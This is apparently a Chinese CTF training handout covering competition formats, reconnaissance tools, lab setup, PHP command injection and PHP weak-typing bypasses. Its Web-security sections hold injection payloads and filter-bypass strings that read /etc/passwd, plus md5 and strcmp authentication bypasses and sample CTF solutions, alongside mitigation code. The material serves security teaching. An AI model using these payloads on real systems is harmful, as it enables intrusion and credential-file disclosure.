# 第四天：网络安全竞赛赛制及技术路线分析、网络攻防基础、Web安全基础（一）

---

## 学习目标

- 了解网络安全竞赛赛制和成长路线
- 掌握Web安全基础知识
- 学会安全信息收集技术
- 搭建渗透测试环境
- 掌握PHP命令执行漏洞
- 了解PHP黑魔法技巧

---

## 一、网络安全竞赛赛制及技术路线分析

### 1.1 经典网络安全竞赛赛制介绍

**CTF竞赛模式：**

**Jeopardy（解题模式）：**
```
特点：
- 题目分类明确（Web、Pwn、Crypto、MISC、Reverse）
- 题目分值不同
- 按解题数量和时间排名
- 适合新手入门

常见赛制：
- 个人赛
- 团队赛（2-5人）
- 线上赛/线下赛
```

**Attack-Defense（攻防模式）：**
```
特点：
- 每队维护自己的服务
- 攻击其他队伍获取flag
- 防守自己服务不被攻击
- 攻防实时对抗

要求：
- 需要攻防兼备能力
- 团队协作要求高
- 需要快速响应能力
```

**King of the Hill（抢占模式）：**
```
特点：
- 争夺服务器控制权
- 占领服务器获取分数
- 防止其他队伍占领
- 实时对抗
```

**竞赛题目类型：**

**Web安全：**
```
- SQL注入
- XSS跨站脚本
- 文件上传漏洞
- 文件包含漏洞
- 命令执行漏洞
- 反序列化漏洞
- SSRF服务端请求伪造
- XXE外部实体注入
```

**Pwn（二进制漏洞利用）：**
```
- 栈溢出
- 堆溢出
- 格式化字符串漏洞
- 整数溢出
- Use-After-Free
- Double Free
```

**Crypto（密码学）**
```
- 古典密码
- 现代密码攻击
- RSA攻击
- AES攻击
- 哈希碰撞
- 随机数预测
```

**MISC（杂项）：**
```
- 隐写术
- 流量分析
- 编码解码
- 文件分析
- 取证分析
- 游戏逆向
```

**Reverse（逆向工程）：**
```
- 程序分析
- 算法逆向
- 加壳脱壳
- 反调试技术
- Android逆向
```

### 1.2 网络安全竞赛技术路线成长

**入门阶段（0-6个月）：**
```
学习内容：
- 计算机网络基础
- 操作系统基础
- 编程语言（Python、C）
- Web安全基础
- MISC基础

练习平台：
- CTFHub
- BugKctf
- 攻防世界
- i春秋
```

**进阶阶段（6-12个月）：**
```
学习内容：
- Web漏洞深入
- Pwn基础
- Crypto基础
- Reverse基础
- 工具使用

练习平台：
- Hack The Box
- TryHackMe
- PentesterLab
- OverTheWire
```

**高级阶段（1-2年）：**
```
学习内容：
- 漏洞挖掘
- 漏洞利用开发
- 内网渗透
- 代码审计
- 安全研究

参与竞赛：
- 全国大学生信息安全竞赛
- XCTF联赛
- 强网杯
- 网鼎杯
```

**专家阶段（2年以上）：**
```
发展方向：
- 安全研究员
- 漏洞挖掘专家
- 红队专家
- 安全架构师
- 安全培训讲师
```

---

## 二、网络攻防基础

### 2.1 Web安全概述

**Web应用架构：**
```
客户端（浏览器）
    ↓ HTTP/HTTPS
Web服务器（Nginx/Apache）
    ↓ CGI/FastCGI
应用服务器（PHP/Python/Java）
    ↓ SQL/NoSQL
数据库（MySQL/PostgreSQL/MongoDB）
```

**Web安全威胁分类：**
```
1. 客户端攻击
   - XSS
   - CSRF
   - 点击劫持

2. 服务端攻击
   - SQL注入
   - 命令注入
   - 文件上传
   - 文件包含
   - 反序列化

3. 认证与授权攻击
   - 暴力破解
   - 会话劫持
   - 越权访问

4. 其他攻击
   - SSRF
   - XXE
   - 逻辑漏洞
```

### 2.2 Web安全信息收集

**Google Hacking技术：**

**常用Google搜索语法：**
```
# 搜索特定网站
site:example.com

# 搜索特定文件类型
filetype:pdf
filetype:doc
filetype:sql

# 搜索特定URL
inurl:admin
inurl:login
inurl:php?id=

# 搜索特定内容
intitle:"index of"
intitle:"admin login"

# 排除关键词
-keyword

# 组合搜索
site:example.com filetype:sql
site:example.com inurl:admin
```

**Google Hacking数据库：**
```
- Exploit-DB：https://www.exploit-db.com/google-hacking-database
- GHDBi：Google Hacking Database
```

**子域名枚举：**

**常用工具：**
```bash
# Sublist3r
python sublist3r.py -d example.com

# subfinder
subfinder -d example.com

# amass
amass enum -d example.com

# 子域名爆破
dnsrecon -d example.com -D subdomains-top1mil.txt -t brt
```

**在线平台：**
```
- VirusTotal：https://www.virustotal.com
- crt.sh：https://crt.sh
- SecurityTrails：https://securitytrails.com
```

**目录扫描：**

**常用工具：**
```bash
# dirsearch
python dirsearch.py -u http://example.com -e php,asp,jsp

# dirb
dirb http://example.com

# gobuster
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt
```

**常用字典：**
```
- /usr/share/wordlists/dirb/common.txt
- /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
- /usr/share/seclists/Discovery/Web-Content/
```

**指纹识别：**

**识别内容：**
```
- Web服务器类型
- 应用框架
- CMS类型
- 编程语言
- 操作系统
```

**常用工具：**
```bash
# whatweb
whatweb http://example.com

# wappalyzer（浏览器插件）
# 检测网站使用的技术

# cmseek
python cmseek.py -u http://example.com
```

### 2.3 虚拟机VMware与Kali系统的安装与调试

**VMware安装：**
```
1. 下载VMware Workstation Pro
2. 运行安装程序
3. 接受许可协议
4. 选择安装路径
5. 完成安装
6. 输入许可证密钥
```

**Kali Linux安装：**
```
1. 下载Kali Linux镜像
   - 官网：https://www.kali.org
   - 选择VMware版本

2. 导入虚拟机
   - 打开VMware
   - 文件 -> 打开
   - 选择下载的.ova文件
   - 导入虚拟机

3. 配置虚拟机
   - 内存：4GB以上
   - 硬盘：80GB以上
   - 网络：NAT或桥接

4. 启动Kali
   - 默认用户名：kali
   - 默认密码：kali

5. 系统更新
   sudo apt update
   sudo apt upgrade -y
```

**Kali常用工具：**
```
信息收集：
- nmap：网络扫描
- recon-ng：信息收集框架
- theHarvester：邮箱和子域名收集

漏洞分析：
- nikto：Web漏洞扫描
- sqlmap：SQL注入工具
- wpscan：WordPress扫描

漏洞利用：
- metasploit：渗透测试框架
- burpsuite：Web安全测试
- hydra：暴力破解

密码攻击：
- john：密码破解
- hashcat：GPU密码破解
- crunch：字典生成

无线攻击：
- aircrack-ng：无线破解
- wifite：自动化无线攻击
```

### 2.4 PHPStudy及PHP编码环境搭建与实训

**PHPStudy安装：**
```
1. 下载PHPStudy
   - 官网：https://www.xp.cn

2. 安装PHPStudy
   - 运行安装程序
   - 选择安装路径
   - 完成安装

3. 启动服务
   - 启动Apache/Nginx
   - 启动MySQL
   - 启动PHP

4. 配置网站
   - 创建网站目录
   - 配置虚拟主机
   - 设置域名
```

**PHP环境测试：**
```php
// 创建info.php
<?php
phpinfo();
?>
```

**PHP基础语法：**
```php
<?php
// 变量
$name = "test";
$age = 18;

// 数组
$arr = array("a", "b", "c");
$arr = ["a", "b", "c"];

// 条件语句
if ($age >= 18) {
    echo "成年";
} else {
    echo "未成年";
}

// 循环
for ($i = 0; $i < 10; $i++) {
    echo $i;
}

// 函数
function hello($name) {
    return "Hello, " . $name;
}

// 超全局变量
$_GET    // GET参数
$_POST   // POST参数
$_COOKIE // Cookie
$_SESSION // Session
$_SERVER // 服务器信息
$_FILES  // 文件上传
?>
```

### 2.5 Python及编码环境的安装

**Python安装：**
```
1. 下载Python
   - 官网：https://www.python.org
   - 下载最新版本

2. 安装Python
   - 运行安装程序
   - 勾选"Add Python to PATH"
   - 选择自定义安装
   - 完成安装

3. 验证安装
   python --version
   pip --version
```

**pip配置：**
```bash
# 使用国内镜像源
pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple

# 或临时使用
pip install xxx -i https://pypi.tuna.tsinghua.edu.cn/simple
```

**Python基础语法：**
```python
# 变量
name = "test"
age = 18

# 列表
arr = ["a", "b", "c"]

# 字典
user = {"name": "test", "age": 18}

# 条件语句
if age >= 18:
    print("成年")
else:
    print("未成年")

# 循环
for i in range(10):
    print(i)

# 函数
def hello(name):
    return f"Hello, {name}"

# 文件操作
with open("file.txt", "r") as f:
    content = f.read()

# 网络请求
import requests
response = requests.get("http://example.com")
print(response.text)
```

**Python安全库：**
```python
# requests - HTTP请求
import requests

# BeautifulSoup - HTML解析
from bs4 import BeautifulSoup

# scrapy - 爬虫框架
import scrapy

# pycryptodome - 加密库
from Crypto.Cipher import AES

# pwntools - 二进制利用
from pwn import *

# scapy - 网络包处理
from scapy.all import *
```

---

## 三、Web安全基础（一）

### 3.1 PHP命令执行漏洞串讲

**PHP命令执行函数：**

**system()：**
```php
<?php
// 执行系统命令并输出结果
system("whoami");
system("ls -la");
system("cat /etc/passwd");
?>
```

**exec()：**
```php
<?php
// 执行命令，返回最后一行
$output = exec("whoami");
echo $output;

// 获取所有输出
exec("ls -la", $output);
print_r($output);
?>
```

**passthru()：**
```php
<?php
// 执行命令并直接输出原始输出
passthru("ls -la");
?>
```

**shell_exec()：**
```php
<?php
// 执行命令，返回完整输出
$output = shell_exec("ls -la");
echo $output;

// 等价写法
$output = `ls -la`;
echo $output;
?>
```

**popen()：**
```php
<?php
// 打开进程文件指针
$handle = popen("ls -la", "r");
$output = fread($handle, 4096);
pclose($handle);
echo $output;
?>
```

**proc_open()：**
```php
<?php
// 更高级的进程控制
$descriptors = [
    0 => ["pipe", "r"],  // stdin
    1 => ["pipe", "w"],  // stdout
    2 => ["pipe", "w"],  // stderr
];

$process = proc_open("ls -la", $descriptors, $pipes);
if (is_resource($process)) {
    $output = stream_get_contents($pipes[1]);
    fclose($pipes[1]);
    $return_value = proc_close($process);
    echo $output;
}
?>
```

**命令注入原理：**
```php
<?php
// 危险代码示例
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
?>

# 正常访问
http://target/ping.php?ip=127.0.0.1

# 攻击利用
http://target/ping.php?ip=127.0.0.1;cat /etc/passwd
http://target/ping.php?ip=127.0.0.1|whoami
http://target/ping.php?ip=127.0.0.1&&whoami
http://target/ping.php?ip=`whoami`
http://target/ping.php?ip=$(whoami)
```

**命令连接符：**
```
;   - 命令分隔，顺序执行
|   - 管道，前一个命令的输出作为后一个的输入
||  - 逻辑或，前一个失败才执行后一个
&&  - 逻辑与，前一个成功才执行后一个
&   - 后台执行
```

**命令执行绕过：**
```bash
# 空格绕过
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd

# 关键字绕过
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
/bin/ca? /etc/passwd
/bin/ca? /etc/pass??
cat /etc/pas???
```

**命令执行防护：**
```php
<?php
// 输入白名单验证
$allowed_ips = ["127.0.0.1", "192.168.1.1"];
if (!in_array($ip, $allowed_ips)) {
    die("Invalid IP");
}

// 使用escapeshellarg()转义参数
$ip = escapeshellarg($ip);
system("ping -c 4 " . $ip);

// 使用escapeshellcmd()转义命令
$cmd = escapeshellcmd($cmd);
system($cmd);

// 使用参数化方式
$descriptors = [
    0 => ["pipe", "r"],
    1 => ["pipe", "w"],
];
$process = proc_open(["ping", "-c", "4", $ip], $descriptors, $pipes);
?>
```

### 3.2 PHP黑魔法串讲及实战

**PHP弱类型比较：**
```php
<?php
// == 弱类型比较
// === 强类型比较

// 字符串与数字比较
var_dump("0" == 0);      // true
var_dump("" == 0);       // true
var_dump("1" == 1);      // true
var_dump("1abc" == 1);   // true (PHP 7.x之前)
var_dump(0 == NULL);     // true
var_dump("" == NULL);    // true

// 特殊比较
var_dump(0 == "foo");    // true
var_dump(0 == "");       // true
var_dump(0 == "0");      // true
var_dump(0 == false);    // true
var_dump("" == false);   // true
var_dump("" == null);    // true
var_dump(false == null); // true
?>
```

**类型转换漏洞：**
```php
<?php
// intval()函数
var_dump(intval("123abc"));  // 123
var_dump(intval("abc123"));  // 0
var_dump(intval("0x1A"));    // 0 (不识别十六进制)
var_dump(intval("010"));     // 10 (不识别八进制)
var_dump(intval("1e2"));     // 1 (不识别科学计数法)

// intval()溢出
var_dump(intval("99999999999999999999"));  // 溢出

// is_numeric()函数
var_dump(is_numeric("123"));    // true
var_dump(is_numeric("12.3"));   // true
var_dump(is_numeric("1e2"));    // true
var_dump(is_numeric("0x1A"));   // false (PHP 7.x)
var_dump(is_numeric("123abc")); // false
?>
```

**md5()函数漏洞：**
```php
<?php
// md5()返回字符串
var_dump(md5("240610708"));  // 0e462097431906509019562988736854
var_dump(md5("QNKCDZO"));   // 0e830400451993494058024219903391

// 0e开头的md5值在弱比较时等于0
var_dump(md5("240610708") == md5("QNKCDZO"));  // true

// md5碰撞
$a = "aaK1STfY";
$b = "aaO8zKZF";
var_dump(md5($a) == md5($b));  // true (都是0e开头)
?>
```

**md5()数组绕过：**
```php
<?php
// md5()不能处理数组
$a = ["1", "2"];
$b = ["3", "4"];
var_dump(md5($a) == md5($b));  // true (都返回NULL)

// 绕过示例
if (md5($a) == md5($b)) {
    echo "Pass";
}
?>
```

**strcmp()函数漏洞：**
```php
<?php
// strcmp()比较字符串
// 返回值：<0 (str1<str2), 0 (相等), >0 (str1>str2)

// 传入数组会返回NULL
$a = ["1", "2"];
var_dump(strcmp($a, "test"));  // NULL

// NULL == 0 为true
if (strcmp($a, "test") == 0) {
    echo "Pass";  // 会执行
}
?>
```

**switch()类型转换：**
```php
<?php
// switch()会进行类型转换
$num = "1abc";
switch ($num) {
    case 0:
        echo "Case 0";  // 会执行
        break;
    case 1:
        echo "Case 1";
        break;
    default:
        echo "Default";
}
?>
```

**in_array()类型混淆：**
```php
<?php
// in_array()默认弱比较
$whitelist = [0, 1, 2, 3];
$user_input = "1abc";

if (in_array($user_input, $whitelist)) {
    echo "Pass";  // 会执行，因为"1abc" == 1
}

// 使用严格模式
if (in_array($user_input, $whitelist, true)) {
    echo "Pass";  // 不会执行
}
?>
```

**preg_match()绕过：**
```php
<?php
// preg_match()只能处理字符串
// 传入数组返回false

$pattern = "/^[a-zA-Z0-9]+$/";
$input = ["test"];

if (preg_match($pattern, $input)) {
    echo "Match";
} else {
    echo "Not match";  // 会执行
}

// NULL字节截断（PHP < 7.0）
$input = "test\x00<script>";
if (preg_match("/^test$/", $input)) {
    echo "Match";  // PHP < 7.0会执行
}
?>
```

### 3.3 大赛经典试题实操与复盘分析

**题目1：命令执行**
```php
<?php
// 题目代码
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    if (preg_match('/flag/i', $cmd)) {
        die("Hacker!");
    }
    system($cmd);
}
?>
```

**解题思路：**
```bash
# 绕过flag过滤
cmd=cat /f?ag
cmd=cat /f[l]ag
cmd=cat /fla*
cmd=c'a't /flag
cmd=c"a"t /flag
cmd=cat /etc/passwd
cmd=cat /flag | base64
```

**题目2：PHP弱类型**
```php
<?php
// 题目代码
if (isset($_GET['a']) && isset($_GET['b'])) {
    $a = $_GET['a'];
    $b = $_GET['b'];
    if ($a != $b && md5($a) == md5($b)) {
        echo "Flag: xxx";
    }
}
?>
```

**解题思路：**
```bash
# 使用0e开头的md5值
a=240610708&b=QNKCDZO
a=s878926199a&b=s155964671a
a=s214587387a&b=s214587387a
```

**题目3：strcmp绕过**
```php
<?php
// 题目代码
if (isset($_GET['password'])) {
    if (strcmp($_GET['password'], "admin") == 0) {
        echo "Flag: xxx";
    }
}
?>
```

**解题思路：**
```bash
# 传入数组
password[]=test
```

---

## 四、Wireshark实操

### 4.1 抓取Web登录流量

**实验步骤：**
```
1. 打开Wireshark，选择网卡
2. 设置过滤器：http
3. 开始捕获
4. 浏览器访问登录页面
5. 输入用户名密码登录
6. 停止捕获
7. 分析登录请求
```

**分析登录请求：**
```
1. 找到POST请求
2. 查看请求体
3. 识别用户名密码参数
4. 分析Cookie/Session
```

### 4.2 分析Google Hacking流量

**实验步骤：**
```
1. 开始捕获
2. 浏览器进行Google搜索
3. 使用Google Hacking语法
4. 停止捕获
5. 分析搜索流量
```

---

## 五、课后作业

### 作业1：环境搭建
```
1. 安装VMware Workstation
2. 安装Kali Linux虚拟机
3. 安装PHPStudy环境
4. 配置Python开发环境
5. 测试环境可用性
```

### 作业2：信息收集练习
```
对目标网站进行信息收集：
1. 使用Google Hacking收集信息
2. 使用工具进行子域名枚举
3. 使用工具进行目录扫描
4. 使用工具进行指纹识别
5. 撰写信息收集报告
```

### 作业3：PHP命令执行练习
```
搭建DVWA靶场，练习命令执行漏洞：
1. 低安全级别：直接执行命令
2. 中安全级别：绕过简单过滤
3. 高安全级别：绕过复杂过滤
4. 撰写漏洞利用报告
```

### 作业4：PHP黑魔法练习
```
练习PHP弱类型绕过：
1. 练习md5()绕过
2. 练习strcmp()绕过
3. 练习switch()绕过
4. 练习in_array()绕过
5. 撰写解题报告
```

---

## 常用工具速查

### 信息收集工具
```bash
# Nmap扫描
nmap -sV -sC -O target

# 子域名枚举
sublist3r -d example.com

# 目录扫描
dirsearch -u http://example.com

# 指纹识别
whatweb http://example.com
```

### Kali Linux常用命令
```bash
# 更新系统
sudo apt update && sudo apt upgrade

# 启动服务
sudo service apache2 start
sudo service mysql start

# 网络配置
ifconfig
ip addr show
```

---

## 学习资源

### CTF平台
- CTFHub：https://www.ctfhub.com
- 攻防世界：https://adworld.xctf.org.cn
- BugKuctf：https://www.bugku.com
- i春秋：https://www.ichunqiu.com

### 靶场环境
- DVWA：Damn Vulnerable Web Application
- SQLi-labs：SQL注入练习
- Pikachu：Web漏洞练习
- Upload-labs：文件上传练习

### 学习社区
- 看雪论坛：https://bbs.kanxue.com
- 安全客：https://www.anquanke.com
- FreeBuf：https://www.freebuf.com

---

## 总结

第四天的学习重点：
1. **竞赛赛制**：了解CTF竞赛模式和题目类型
2. **技术路线**：规划网络安全学习成长路径
3. **信息收集**：掌握Google Hacking、子域名枚举、目录扫描
4. **环境搭建**：学会搭建渗透测试环境
5. **命令执行**：掌握PHP命令执行漏洞原理和利用
6. **PHP黑魔法**：了解PHP弱类型和类型转换漏洞

通过今天的学习，你将具备参加网络安全竞赛的基础知识和技能。